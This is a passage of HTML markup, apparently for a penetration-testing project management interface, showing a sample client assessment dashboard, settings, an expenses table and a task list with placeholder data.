                                    <div class="action-title" style="font-weight: 600; margin-bottom: 0.5rem; color: var(--text-primary);">Methodology Library</div>
                                    <div class="action-desc" style="color: var(--text-secondary); font-size: 0.875rem;">Access testing frameworks and procedures</div>
                                </div>
                                
                                <div class="action-card" onclick="navigateToScreen('templates')" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div class="action-icon" style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <div class="action-title" style="font-weight: 600; margin-bottom: 0.5rem; color: var(--text-primary);">Report Templates</div>
                                    <div class="action-desc" style="color: var(--text-secondary); font-size: 0.875rem;">Pre-built report and finding templates</div>
                                </div>
                                
                                <div class="action-card" onclick="openModal('settingsModal')" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div class="action-icon" style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <div class="action-title" style="font-weight: 600; margin-bottom: 0.5rem; color: var(--text-primary);">Settings</div>
                                    <div class="action-desc" style="color: var(--text-secondary); font-size: 0.875rem;">Configure platform preferences</div>
                                </div>
                                
                                <div class="action-card" onclick="openHelpCenter()" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div class="action-icon" style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <div class="action-title" style="font-weight: 600; margin-bottom: 0.5rem; color: var(--text-primary);">Help & Support</div>
                                    <div class="action-desc" style="color: var(--text-secondary); font-size: 0.875rem;">Documentation and assistance</div>
                                </div>
                            </div>
                        </div>
                        
                        <style>
                            .project-action-card:hover {
                                transform: translateY(-2px);
                                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
                            }
                            
                            .recent-project:hover {
                                background: var(--bg-accent);
                            }
                            
                            .action-card:hover {
                                transform: translateY(-2px);
                            }
                            
                            @media (max-width: 768px) {
                                .home-grid {
                                    grid-template-columns: 1fr !important;
                                }
                            }
                        </style>
                    </div>
                </div>
                
                <!-- Dashboard Screen -->
                <div class="screen-content" id="dashboard">
                    <div style="padding: 1rem;">
                        <!-- Project Header with Management Options -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-bottom: 2rem; border: 1px solid var(--border);">
                            <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 1.5rem;">
                                <div style="flex: 1;">
                                    <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
                                        <h2 style="color: var(--text-primary); margin: 0;">Acme Corporation - Internal Network Assessment</h2>
                                        <button class="action-btn secondary" onclick="editProjectDetails()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                             Edit Project
                                        </button>
                                    </div>
                                    
                                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Project ID:</span>
                                            <div style="font-weight: 600;">PROJ-001</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Client:</span>
                                            <div style="font-weight: 600;">Acme Corporation</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Type:</span>
                                            <div style="font-weight: 600;">Internal Network Assessment</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Status:</span>
                                            <span class="tag" style="background: var(--success); color: white; font-size: 0.75rem;">Active</span>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">Start Date:</span>
                                            <div style="font-weight: 600;">15 Nov 2024</div>
                                        </div>
                                        <div>
                                            <span style="color: var(--text-secondary); font-size: 0.875rem;">End Date:</span>
                                            <div style="font-weight: 600;">22 Nov 2024</div>
                                        </div>
                                    </div>
                                    
                                    <div style="background: var(--bg-primary); padding: 1rem; border-radius: 6px; border-left: 4px solid var(--text-accent);">
                                        <div style="font-weight: 600; color: var(--text-primary); margin-bottom: 0.5rem;">Project Scope:</div>
                                        <div style="color: var(--text-secondary); font-size: 0.875rem; line-height: 1.4;">
                                            Comprehensive security assessment of internal network infrastructure including Active Directory, file servers, and workstations. Testing includes vulnerability assessment, penetration testing, and privilege escalation attempts.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div style="display: flex; gap: 0.75rem; flex-wrap: wrap;">
                                <button class="action-btn secondary" onclick="editProjectScope()"> Edit Scope</button>
                                <button class="action-btn secondary" onclick="manageTeamMembers()"> Team Members</button>
                                <button class="action-btn secondary" onclick="exportProject()"> Export Project</button>
                                <button class="action-btn secondary" onclick="archiveProject()"> Archive</button>
                                <button class="action-btn primary" onclick="navigateToScreen('findings')">+ Add Finding</button>
                            </div>
                        </div>

                        <!-- Project Information Sections -->
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-top: 3rem;">
                            <!-- Constraints and Observations -->
                            <div class="info-section" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border);">
                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                    <h3 style="color: var(--text-primary); margin: 0; display: flex; align-items: center; gap: 0.5rem;">
                                         Constraints and Observations
                                    </h3>
                                    <button class="action-btn secondary" onclick="editConstraints()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                         Edit
                                    </button>
                                </div>
                                
                                <div id="constraintsContent" style="line-height: 1.6; color: var(--text-secondary);">
                                    The time frame provisioned for the completion of this engagement was adequate. No constraints were encountered during the engagement.
                                </div>
                                
                                <div id="constraintsEditor" style="display: none;">
                                    <textarea id="constraintsText" class="form-textarea" rows="4" style="width: 100%; margin-bottom: 1rem;">The time frame provisioned for the completion of this engagement was adequate. No constraints were encountered during the engagement.</textarea>
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" onclick="saveConstraints()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                             Save
                                        </button>
                                        <button class="action-btn secondary" onclick="cancelConstraintsEdit()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                             Cancel
                                        </button>
                                    </div>
                                </div>
                            </div>

                            <!-- Rules of Engagement -->
                            <div class="info-section" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border);">
                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                    <h3 style="color: var(--text-primary); margin: 0; display: flex; align-items: center; gap: 0.5rem;">
                                         Rules of Engagement
                                    </h3>
                                    <button class="action-btn secondary" onclick="editRules()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                         Edit
                                    </button>
                                </div>
                                
                                <div id="rulesContent">
                                    <ul style="margin: 0; padding-left: 1.5rem; line-height: 1.6; color: var(--text-secondary);">
                                        <li style="margin-bottom: 0.5rem;">Social engineering was not permitted.</li>
                                        <li style="margin-bottom: 0.5rem;">Denial of Service (DoS) testing was not permitted.</li>
                                    </ul>
                                </div>
                                
                                <div id="rulesEditor" style="display: none;">
                                    <div id="rulesList" style="margin-bottom: 1rem;">
                                        <div class="rule-item" style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                            <input type="text" class="form-input" value="Social engineering was not permitted." style="flex: 1;">
                                            <button class="table-btn danger" onclick="removeRule(this)" title="Remove"></button>
                                        </div>
                                        <div class="rule-item" style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                            <input type="text" class="form-input" value="Denial of Service (DoS) testing was not permitted." style="flex: 1;">
                                            <button class="table-btn danger" onclick="removeRule(this)" title="Remove"></button>
                                        </div>
                                    </div>
                                    
                                    <button class="action-btn secondary" onclick="addRule()" style="width: 100%; margin-bottom: 1rem; font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                        + Add Rule
                                    </button>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" onclick="saveRules()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                             Save
                                        </button>
                                        <button class="action-btn secondary" onclick="cancelRulesEdit()" style="font-size: 0.875rem; padding: 0.5rem 0.75rem;">
                                             Cancel
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Additional Dashboard Stats -->
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-top: 3rem;">
                            <div class="stat-card" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border); text-align: center;">
                                <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                <div style="font-size: 1.5rem; font-weight: 600; color: var(--text-primary); margin-bottom: 0.25rem;">15</div>
                                <div style="color: var(--text-secondary); font-size: 0.875rem;">Total Findings</div>
                            </div>
                            
                            <div class="stat-card" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border); text-align: center;">
                                <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                <div style="font-size: 1.5rem; font-weight: 600; color: var(--danger); margin-bottom: 0.25rem;">3</div>
                                <div style="color: var(--text-secondary); font-size: 0.875rem;">Critical Issues</div>
                            </div>
                            
                            <div class="stat-card" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border); text-align: center;">
                                <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                <div style="font-size: 1.5rem; font-weight: 600; color: var(--text-accent); margin-bottom: 0.25rem;">47</div>
                                <div style="color: var(--text-secondary); font-size: 0.875rem;">Screenshots</div>
                            </div>
                            
                            <div class="stat-card" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border); text-align: center;">
                                <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                <div style="font-size: 1.5rem; font-weight: 600; color: var(--warning); margin-bottom: 0.25rem;">8</div>
                                <div style="color: var(--text-secondary); font-size: 0.875rem;">Attack Chains</div>
                            </div>
                            
                            <div class="stat-card" style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; border: 1px solid var(--border); text-align: center;">
                                <div style="font-size: 2rem; margin-bottom: 0.5rem;"></div>
                                <div style="font-size: 1.5rem; font-weight: 600; color: var(--success); margin-bottom: 0.25rem;">85%</div>
                                <div style="color: var(--text-secondary); font-size: 0.875rem;">Completion</div>
                            </div>
                        </div>

                        <!-- Responsive Grid for Mobile -->
                        <style>
                            @media (max-width: 768px) {
                                .dashboard-grid {
                                    grid-template-columns: 1fr !important;
                                    gap: 1rem !important;
                                }
                            }
                        </style>
                    </div>
                </div>
                
                <!-- Settings Screen -->
                <div class="screen-content" id="settings">
                    <div style="padding: 1rem;">
                        <div style="max-width: 800px; margin: 0 auto;">
                            <!-- Settings Header -->
                            <div style="margin-bottom: 2rem;">
                                <h2 style="color: var(--text-primary); margin-bottom: 0.5rem;">Settings</h2>
                                <p style="color: var(--text-secondary);">Customize your application preferences and account settings.</p>
                            </div>

                            <!-- Appearance Settings -->
                            <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-bottom: 2rem; border: 1px solid var(--border);">
                                <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                     Appearance
                                </h3>
                                
                                <div class="settings-group">
                                    <label class="settings-label">Theme</label>
                                    <div style="display: flex; gap: 1rem; margin-top: 0.5rem;">
                                        <button class="theme-option" onclick="setTheme('light')" id="lightThemeBtn">
                                            <span></span>
                                            <span>Light</span>
                                        </button>
                                        <button class="theme-option" onclick="setTheme('dark')" id="darkThemeBtn">
                                            <span></span>
                                            <span>Dark</span>
                                        </button>
                                        <button class="theme-option" onclick="setTheme('auto')" id="autoThemeBtn">
                                            <span></span>
                                            <span>Auto</span>
                                        </button>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Choose your preferred color scheme or let the system decide.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <label class="settings-label">Interface Density</label>
                                    <select class="form-select" style="margin-top: 0.5rem;">
                                        <option value="compact">Compact</option>
                                        <option value="comfortable" selected>Comfortable</option>
                                        <option value="spacious">Spacious</option>
                                    </select>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Adjust the spacing and size of interface elements.
                                    </div>
                                </div>
                            </div>

                            <!-- Notifications Settings -->
                            <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-bottom: 2rem; border: 1px solid var(--border);">
                                <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                     Notifications
                                </h3>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input" checked>
                                            <span class="toggle-slider"></span>
                                            <span>Desktop Notifications</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Show browser notifications for important events.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input" checked>
                                            <span class="toggle-slider"></span>
                                            <span>Agent Status Alerts</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Get notified when agents connect or disconnect.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input">
                                            <span class="toggle-slider"></span>
                                            <span>Sound Effects</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Play sound effects for various actions.
                                    </div>
                                </div>
                            </div>

                            <!-- Security Settings -->
                            <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-bottom: 2rem; border: 1px solid var(--border);">
                                <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                     Security
                                </h3>
                                
                                <div class="settings-group">
                                    <label class="settings-label">Auto-lock Timeout</label>
                                    <select class="form-select" style="margin-top: 0.5rem;">
                                        <option value="5">5 minutes</option>
                                        <option value="15" selected>15 minutes</option>
                                        <option value="30">30 minutes</option>
                                        <option value="60">1 hour</option>
                                        <option value="never">Never</option>
                                    </select>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Automatically lock the interface after inactivity.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input" checked>
                                            <span class="toggle-slider"></span>
                                            <span>Require Confirmation for Destructive Actions</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Show confirmation dialogs for potentially dangerous operations.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <button class="action-btn secondary"> Change Password</button>
                                    <button class="action-btn secondary" style="margin-left: 0.5rem;"> Two-Factor Authentication</button>
                                </div>
                            </div>

                            <!-- Data & Privacy -->
                            <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-bottom: 2rem; border: 1px solid var(--border);">
                                <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                     Data & Privacy
                                </h3>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input">
                                            <span class="toggle-slider"></span>
                                            <span>Usage Analytics</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Help improve the application by sharing anonymous usage data.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <label class="settings-label">Data Retention</label>
                                    <select class="form-select" style="margin-top: 0.5rem;">
                                        <option value="30">30 days</option>
                                        <option value="90" selected>90 days</option>
                                        <option value="180">180 days</option>
                                        <option value="365">1 year</option>
                                        <option value="never">Never delete</option>
                                    </select>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        How long to keep project data and logs.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <button class="action-btn secondary"> Export Data</button>
                                    <button class="action-btn danger" style="margin-left: 0.5rem;"> Clear All Data</button>
                                </div>
                            </div>

                            <!-- Advanced Settings -->
                            <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border);">
                                <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                     Advanced
                                </h3>
                                
                                <div class="settings-group">
                                    <div class="settings-toggle">
                                        <label class="toggle-label">
                                            <input type="checkbox" class="toggle-input">
                                            <span class="toggle-slider"></span>
                                            <span>Developer Mode</span>
                                        </label>
                                    </div>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Enable advanced debugging features and console logging.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <label class="settings-label">API Base URL</label>
                                    <input type="text" class="form-input" value="https://api.madness.local" style="margin-top: 0.5rem;">
                                    <div style="color: var(--text-secondary); font-size: 0.875rem; margin-top: 0.5rem;">
                                        Backend API endpoint for data synchronization.
                                    </div>
                                </div>
                                
                                <div class="settings-group">
                                    <button class="action-btn secondary"> Reset to Defaults</button>
                                    <button class="action-btn secondary" style="margin-left: 0.5rem;"> Export Settings</button>
                                    <button class="action-btn secondary" style="margin-left: 0.5rem;"> Import Settings</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Expenses Screen -->
                <div class="screen-content" id="expenses">
                    <div class="assets-container">
                        <!-- Expenses Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">572.74</div>
                                    <div class="summary-label">Total Amount</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">260.25</div>
                                    <div class="summary-label">Billable</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">312.49</div>
                                    <div class="summary-label">Personal</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">7</div>
                                    <div class="summary-label">This Month</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportExpenses()"> Export</button>
                                <button class="action-btn secondary" onclick="openModal('importExpensesModal')"> Import</button>
                                <button class="action-btn primary" onclick="openExpenseModal()">+ Add Expense</button>
                            </div>
                        </div>
                        
                        <!-- Expenses Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterExpenses('all')">All</button>
                                    <button class="filter-btn" onclick="filterExpenses('billable')">Billable</button>
                                    <button class="filter-btn" onclick="filterExpenses('personal')">Personal</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterExpenses('travel')"> Travel</button>
                                    <button class="filter-btn" onclick="filterExpenses('accommodation')"> Accommodation</button>
                                    <button class="filter-btn" onclick="filterExpenses('food')"> Food</button>
                                    <button class="filter-btn" onclick="filterExpenses('equipment')"> Equipment</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Period:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterExpenses('this-month')">This Month</button>
                                    <button class="filter-btn" onclick="filterExpenses('last-month')">Last Month</button>
                                    <button class="filter-btn" onclick="filterExpenses('this-quarter')">This Quarter</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="expenseSearch" placeholder="Search expenses, notes, vendors..." onkeyup="searchExpenses()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Expenses Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="expensesTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortExpenses('date')">Date <span class="sort-arrow"></span></th>
                                        <th onclick="sortExpenses('description')">Description <span class="sort-arrow"></span></th>
                                        <th onclick="sortExpenses('category')">Category <span class="sort-arrow"></span></th>
                                        <th onclick="sortExpenses('type')">Type <span class="sort-arrow"></span></th>
                                        <th onclick="sortExpenses('amount')">Amount <span class="sort-arrow"></span></th>
                                        <th>Notes</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="asset-row" data-type="billable" data-category="travel">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>15/11/2024</strong></td>
                                        <td><strong>Train ticket to client meeting</strong></td>
                                        <td><span class="asset-type travel"> Travel</span></td>
                                        <td><span class="tag billable">Billable</span></td>
                                        <td style="font-weight: 600; color: var(--success);">125.50</td>
                                        <td>Train ticket to client meeting in Manchester</td>
                                        <td>
                                            <button class="table-btn" onclick="editExpense(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteExpense(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="billable" data-category="accommodation">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>14/11/2024</strong></td>
                                        <td><strong>Hotel stay - Premier Inn</strong></td>
                                        <td><span class="asset-type accommodation"> Accommodation</span></td>
                                        <td><span class="tag billable">Billable</span></td>
                                        <td style="font-weight: 600; color: var(--success);">89.00</td>
                                        <td>Hotel stay - Premier Inn Manchester</td>
                                        <td>
                                            <button class="table-btn" onclick="editExpense(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteExpense(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="billable" data-category="food">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>14/11/2024</strong></td>
                                        <td><strong>Client dinner - The Ivy</strong></td>
                                        <td><span class="asset-type food"> Food</span></td>
                                        <td><span class="tag billable">Billable</span></td>
                                        <td style="font-weight: 600; color: var(--success);">45.75</td>
                                        <td>Client dinner - The Ivy Manchester</td>
                                        <td>
                                            <button class="table-btn" onclick="editExpense(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteExpense(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Train ticket to client meeting</div>
                                        <div class="asset-card-subtitle">15/11/2024 - Travel</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="tag billable">Billable</span>
                                        <span style="font-weight: 600; color: var(--success);">125.50</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="expensesBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="expensesSelectedCount">0</span> expenses selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkMarkBillable()">Mark as Billable</button>
                                <button class="bulk-btn" onclick="bulkExportExpenses()">Export Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteExpenses()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Other placeholder screens -->
                <div class="screen-content" id="tasks">
                    <div class="assets-container">
                        <!-- Tasks Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">12</div>
                                    <div class="summary-label">Total Tasks</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">3</div>
                                    <div class="summary-label">Urgent</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">7</div>
                                    <div class="summary-label">In Progress</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">2</div>
                                    <div class="summary-label">Completed</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportTasks()"> Export</button>
                                <button class="action-btn secondary" onclick="openModal('importTasksModal')"> Import</button>
                                <button class="action-btn primary" onclick="openModal('newTaskModal')">+ Add Task</button>
                            </div>
                        </div>
                        
                        <!-- Tasks Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterTasks('all')">All</button>
                                    <button class="filter-btn" onclick="filterTasks('admin')"> Admin</button>
                                    <button class="filter-btn" onclick="filterTasks('legal')"> Legal</button>
                                    <button class="filter-btn" onclick="filterTasks('setup')"> Setup</button>
                                    <button class="filter-btn" onclick="filterTasks('communication')"> Communication</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterTasks('urgent')">Urgent</button>
                                    <button class="filter-btn" onclick="filterTasks('in-progress')">In Progress</button>
                                    <button class="filter-btn" onclick="filterTasks('completed')">Completed</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Priority:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterTasks('high')">High</button>
                                    <button class="filter-btn" onclick="filterTasks('medium')">Medium</button>
                                    <button class="filter-btn" onclick="filterTasks('low')">Low</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="taskSearch" placeholder="Search tasks, assignees, descriptions..." onkeyup="searchTasks()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Tasks Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="tasksTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortTasks('task')">Task <span class="sort-arrow"></span></th>
                                        <th onclick="sortTasks('category')">Category <span class="sort-arrow"></span></th>
                                        <th onclick="sortTasks('status')">Status <span class="sort-arrow"></span></th>
                                        <th onclick="sortTasks('priority')">Priority <span class="sort-arrow"></span></th>
                                        <th onclick="sortTasks('assigned')">Assigned <span class="sort-arrow"></span></th>
                                        <th onclick="sortTasks('due')">Due Date <span class="sort-arrow"></span></th>
                                        <th>Progress</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                    <tr class="asset-row" data-category="legal" data-status="urgent" data-priority="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Chase Authorization Form</strong></td>
                                        <td><span class="asset-type network"> Legal</span></td>
                                        <td><span class="status not-started">Urgent</span></td>
                                        <td><span class="criticality critical">High</span></td>
                                        <td>John Doe</td>
                                        <td><span style="color: var(--danger);">15/11/2024</span></td>
                                        <td><span style="color: var(--danger);">Overdue</span></td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="setup" data-status="in-progress" data-priority="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>VPN Access Setup</strong></td>
                                        <td><span class="asset-type network"> Setup</span></td>
                                        <td><span class="status testing">In Progress</span></td>
                                        <td><span class="criticality high">High</span></td>
                                        <td>Tech Team</td>
                                        <td>16/11/2024</td>
                                        <td>60%</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="communication" data-status="urgent" data-priority="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Send Address Information</strong></td>
                                        <td><span class="asset-type network"> Communication</span></td>
                                        <td><span class="status urgent">Urgent</span></td>
                                        <td><span class="criticality high">High</span></td>
                                        <td>Admin Team</td>
                                        <td><span style="color: var(--warning);">17/11/2024</span></td>
                                        <td>Pending</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="setup" data-status="pending" data-priority="medium">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Check VPN Access</strong></td>
                                        <td><span class="asset-type network"> Setup</span></td>
                                        <td><span class="status pending">Pending</span></td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td>Tech Team</td>
                                        <td>20/11/2024</td>
                                        <td>Not Started</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="communication" data-status="pending" data-priority="medium">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Schedule Kickoff Meeting</strong></td>
                                        <td><span class="asset-type network"> Communication</span></td>
                                        <td><span class="status pending">Pending</span></td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td>Project Manager</td>
                                        <td>22/11/2024</td>
                                        <td>Not Started</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="communication" data-status="pending" data-priority="medium">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Finalize Emergency Contacts</strong></td>
                                        <td><span class="asset-type network"> Communication</span></td>
